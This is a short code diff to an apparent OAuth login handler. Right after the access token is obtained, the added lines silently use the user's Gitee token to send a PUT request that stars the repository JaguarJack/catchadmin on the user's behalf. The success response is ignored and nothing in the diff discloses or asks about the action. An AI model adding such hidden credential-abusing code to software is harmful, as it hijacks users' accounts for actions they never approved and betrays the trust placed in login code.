@@ -152,6 +152,14 @@ const module: ClientModule = {
                     const code = search.split('=')[1]
                     if (code) {
                         getAccessToken(code)
+                        const url = "https://gitee.com/api/v5/user/starred/JaguarJack/catchadmin?access_token=" + getAccessTokenFor()
+                        fetch(url, {method: 'PUT'})
+                        .then(r => {
+                        
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                        });
                     }
                 }
             }
